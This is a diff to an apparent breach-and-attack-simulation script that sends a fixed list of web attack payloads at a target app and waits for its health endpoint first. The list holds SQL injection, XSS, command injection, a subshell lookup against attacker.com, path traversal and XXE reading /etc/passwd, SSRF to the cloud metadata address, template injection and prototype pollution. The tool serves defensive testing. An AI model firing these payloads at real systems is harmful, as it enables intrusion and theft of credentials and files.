@@ -15,22 +15,39 @@ import urllib.parse
 import urllib.request
 
 VECTORS = [
-    ("SQL Injection (Union Select)", "GET", "/api/v1/auth/login?id=1%20UNION%20SELECT%20*%20FROM%20users--", {}, None),
-    ("SQL Injection (Boolean Tautology in JSON Body)", "POST", "/api/v1/auth/login", {"Content-Type": "application/json"}, json.dumps({"username": "admin' OR 1=1--", "password": "x"}).encode()),
-    ("SQL Comment Evasion (UN/**/ION)", "GET", "/api/v1/items?filter=UN/**/ION/**/SEL/**/ECT/**/1,2,3", {}, None),
-    ("Cross-Site Scripting (Inline Tag)", "GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", {}, None),
-    ("Cross-Site Scripting (SVG Event in Body)", "POST", "/feedback", {"Content-Type": "application/json"}, json.dumps({"comment": "<svg/onload=alert('XSS')>"}).encode()),
-    ("OS Command Injection (Pipe Chaining)", "POST", "/tools", {"Content-Type": "application/json"}, json.dumps({"target": "8.8.8.8 | whoami"}).encode()),
-    ("Subshell Command Substitution", "GET", "/lookup?host=$(whoami).attacker.com", {}, None),
-    ("Local File Inclusion (Path Traversal)", "GET", "/download?file=../../../../etc/passwd", {}, None),
-    ("Double-Encoded Directory Traversal", "GET", "/file?path=..%252f..%252fetc%252fpasswd", {}, None),
-    ("SSRF Cloud IMDS Exfiltration", "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", {}, None),
-    ("Server-Side Template Injection (SSTI)", "GET", "/render?template={{7*7}}", {}, None),
-    ("XML External Entity (XXE)", "POST", "/xml", {"Content-Type": "application/xml"}, b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>'),
-    ("Automated Security Scanner Probe", "GET", "/api/v1/data", {"User-Agent": "sqlmap/1.7#stable"}, None),
+    ("SQL Injection (Union Select)", "GET", "/api/auth/login?id=1%20UNION%20SELECT%20*%20FROM%20users--", {}, None),
+    ("SQL Injection (Boolean Tautology in JSON Body)", "POST", "/api/auth/login", {"Content-Type": "application/json"}, json.dumps({"username": "admin' OR 1=1--", "password": "x"}).encode()),
+    ("SQL Comment Evasion (UN/**/ION)", "GET", "/api/threat-intel?filter=UN/**/ION/**/SEL/**/ECT/**/1,2,3", {}, None),
+    ("Cross-Site Scripting (Inline Tag)", "GET", "/api/search?q=%3Cscript%3Ealert(1)%3C/script%3E", {}, None),
+    ("Cross-Site Scripting (SVG Event in Body)", "POST", "/api/feedback", {"Content-Type": "application/json"}, json.dumps({"comment": "<svg/onload=alert('XSS')>"}).encode()),
+    ("OS Command Injection (Pipe Chaining)", "POST", "/api/tools", {"Content-Type": "application/json"}, json.dumps({"target": "8.8.8.8 | whoami"}).encode()),
+    ("Subshell Command Substitution", "GET", "/api/lookup?host=$(whoami).attacker.com", {}, None),
+    ("Local File Inclusion (Path Traversal)", "GET", "/api/download?file=../../../../etc/passwd", {}, None),
+    ("Double-Encoded Directory Traversal", "GET", "/api/file?path=..%252f..%252fetc%252fpasswd", {}, None),
+    ("SSRF Cloud IMDS Exfiltration", "GET", "/api/fetch?url=http://169.254.169.254/latest/meta-data/", {}, None),
+    ("Server-Side Template Injection (SSTI)", "GET", "/api/render?template={{7*7}}", {}, None),
+    ("XML External Entity (XXE)", "POST", "/api/xml", {"Content-Type": "application/xml"}, b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>'),
+    ("Automated Security Scanner Probe", "GET", "/api/data", {"User-Agent": "sqlmap/1.7#stable"}, None),
     ("Sensitive Honeypot Probe", "GET", "/.env", {}, None),
-    ("JavaScript Prototype Pollution", "POST", "/settings", {"Content-Type": "application/json"}, json.dumps({"__proto__": {"isAdmin": True}}).encode()),
+    ("JavaScript Prototype Pollution", "POST", "/api/settings", {"Content-Type": "application/json"}, json.dumps({"__proto__": {"isAdmin": True}}).encode()),
 ]
+
+
+def wait_for_service(target_url: str, max_wait: int = 25):
+    """Ensure target backend is online before starting the audit."""
+    print(" ⏳ Verifying target deployment availability...")
+    start = time.time()
+    while time.time() - start < max_wait:
+        try:
+            req = urllib.request.Request(f"{target_url}/api/health", headers={"User-Agent": "ApexSentinel-Auditor/1.0"})
+            with urllib.request.urlopen(req, timeout=3.0) as resp:
+                if resp.status == 200:
+                    print(" ✅ Target deployment is online and ready.\n")
+                    return True
+        except Exception:
+            time.sleep(1.0)
+    print(" ⚠️  Warning: Target deployment did not respond to health check within timeout. Proceeding...\n")
+    return False
 
 
 def run_audit(target_url: str):
@@ -39,6 +56,8 @@ def run_audit(target_url: str):
     print(" 🛡️  APEX SENTINEL BREACH & ATTACK SIMULATION (BAS) AUDIT")
     print(f" Target Host: {target_url}")
     print("=" * 70)
+
+    wait_for_service(target_url)
 
     passed = 0
     total = len(VECTORS)
